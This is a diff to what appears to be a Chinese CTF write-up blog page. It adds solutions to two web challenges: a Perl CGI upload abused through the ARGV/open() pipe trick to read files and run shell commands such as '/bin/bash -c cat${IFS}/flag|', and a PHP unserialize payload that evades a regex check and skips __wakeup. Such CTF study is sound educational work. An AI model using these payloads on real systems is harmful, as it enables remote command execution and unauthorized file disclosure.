@@ -98,7 +98,7 @@
 			
 			
 				<i class="iconfont icon-words"></i>
-				<span class="words">6162
+				<span class="words">8153
 				</span>
 			
 		</div>
@@ -258,7 +258,41 @@
 <p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/9fD5jRn7/21.png" class="lazyload"></p>
 <p>可以看到成功执行，发现flag文件，构造php代码读取flag文件即可</p>
 <p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/0yWR3dcv/22.png" class="lazyload"></p>
-<h3 id="0x08-i-got-id-200"><a href="#0x08-i-got-id-200" class="headerlink" title="0x08 i-got-id-200"></a>0x08 i-got-id-200</h3>  	
+<h3 id="0x08-i-got-id-200"><a href="#0x08-i-got-id-200" class="headerlink" title="0x08 i-got-id-200"></a>0x08 i-got-id-200</h3><p>Files页面可以上传文件，随便上传一个，回显出文件内容</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/8CCrGBVH/23.png" class="lazyload"></p>
+<p>网站使用perl写的，perl上传的代码：参考[BlackHatAsia2016](<a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back的Perl漏洞" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back的Perl漏洞</a></p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> $cgi= CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span> ( $cgi-&gt;upload( ‘file‘ ) )</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">my</span> $file= $cgi-&gt;param( ‘file‘ );</span><br><span class="line">     <span class="keyword">while</span> ( &lt;$file&gt; )&#123; </span><br><span class="line">             <span class="keyword">print</span> <span class="string">"$_"</span>; </span><br><span class="line">         &#125; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>upload()</strong>函数用于检查“file”参数是否为上传的文件 </p>
+<p><strong>param()</strong>函数返回所有参数值的列表，但只有第一个值插入$file</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( &lt;$file&gt; )</span><br></pre></td></tr></table></figure>
+
+<p><strong>“&lt;&gt;”</strong>不适用于字符串，除非字符串为<strong>“ARGV”</strong>，在这种情况下，<strong>“&lt;&gt;”</strong>循环通过ARG值将每个值插入<strong>open()</strong>调用</p>
+<p><strong>open()</strong>打开给定文件路径的文件描述符，除非在字符串末尾添加“|”字符，open()可以执行文件，充当<strong>exec()</strong>调用</p>
+<p>尝试在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/Fz0YpTj9/24.png" class="lazyload"></p>
+<p>继续构造url读取文件列表</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?<span class="regexp">/bin/</span>bash -c ls<span class="variable">$&#123;IFS&#125;</span><span class="regexp">/|</span></span><br></pre></td></tr></table></figure>
+
+<p>IFS为Shell的内置变量，是一个用于分割字段的字符列表</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/pTw9Kw5G/25.png" class="lazyload"></p>
+<p>继续构造读取flag即可</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?<span class="regexp">/bin/</span>bash -c cat<span class="variable">$&#123;IFS&#125;</span><span class="regexp">/flag|</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/DzY4wJvK/26.png" class="lazyload"></p>
+<h3 id="0x09-Web-php-unserialize"><a href="#0x09-Web-php-unserialize" class="headerlink" title="0x09 Web_php_unserialize"></a>0x09 Web_php_unserialize</h3><p>代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在反序列化之前需要绕过正则匹配，而且 _wakeup()在 _destruct()调用之前会被自动调用，我们需要绕过 _wake()，参考本文0x02，当序列化字符串表示对象个数的值大于真实个数时就会跳过wakeup()的执行</p>
+<p>我们可以根据代码构造脚本：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$flag = <span class="keyword">new</span> Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">$flag = serialize($flag);</span><br><span class="line">$flag = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$flag);   <span class="comment">//绕过正则匹配</span></span><br><span class="line">$flag = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span> ,$flag);   <span class="comment">//绕过_wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">Tzor<span class="symbol">NDoiRGVtbyI6</span>Mjp<span class="number">7</span>czoxMDoiAERlbW<span class="number">8</span>AZmlsZSI<span class="number">7</span>cz<span class="meta">o4</span>OiJmbDR<span class="symbol">nLnBocCI7</span>fQ==</span><br></pre></td></tr></table></figure>
+
+<p>传入var即可</p>
+<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/Y9GGGr0L/27.png" class="lazyload"></p>
+  	
 					
 	  </div>     
 	  
